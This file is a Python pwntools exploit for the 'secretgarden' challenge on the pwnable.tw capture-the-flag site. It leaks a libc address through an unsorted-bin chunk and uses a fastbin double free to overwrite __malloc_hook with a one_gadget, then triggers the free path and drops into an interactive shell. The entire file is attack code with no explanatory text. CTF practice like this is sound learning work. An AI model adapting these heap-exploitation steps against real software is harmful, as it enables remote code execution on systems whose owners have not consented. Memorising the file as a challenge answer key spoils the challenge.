#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./secretgarden"
elf=ELF(pwn_file)
#libc = elf.libc
libc = ELF("./bc.so.6")
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("chall.pwnable.tw", 10203)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

def add_flower(length, name, color):
    r.sendlineafter("Your choice : ",str(1))
    r.sendlineafter("Length of the name :",str(length))
    r.sendlineafter("The name of flower :",str(name))
    r.sendlineafter("The color of the flower :", str(color))

def remove_flower(index):
    r.sendlineafter("Your choice : ",str(3))
    r.sendlineafter("Which flower do you want to remove from the garden:",str(index))

def visit():
    r.sendlineafter("Your choice : ",str(2))

color = 'b'*23
add_flower(0x140, 'c'*8, color)
add_flower(0x28,  'def', color)
remove_flower(0)
remove_flower(1)
add_flower(0x140, 'a'*7, color)
visit()
r.recvuntil('aaaaaaa\n')
unsortedbin_ptr = u64(r.recv(6) + '\x00\x00')
info("unsortedbin_ptr: %16x", unsortedbin_ptr)
libc.address = unsortedbin_ptr - (0x7ffff7dd1b78 - 0x7ffff7a0e000)
info("libc.address: %16x", libc.address)

one_gadget = libc.address + 0xef6c4

new_chunck_addr = libc.sym['__malloc_hook'] - 0x23
info("new_chunck_addr: %16x", new_chunck_addr)
add_flower(0x68,'a',color) #3
add_flower(0x68,'a',color) #4
remove_flower(3)
remove_flower(4)
remove_flower(3)

add_flower(0x68, p64(new_chunck_addr),color) #5
add_flower(0x68,'a',color) #5
add_flower(0x68,'a',color) #6

payload = 'a'*19 + p64(one_gadget)
add_flower(0x68, payload, color) #7
debug()
remove_flower(5)
remove_flower(5)

r.interactive()
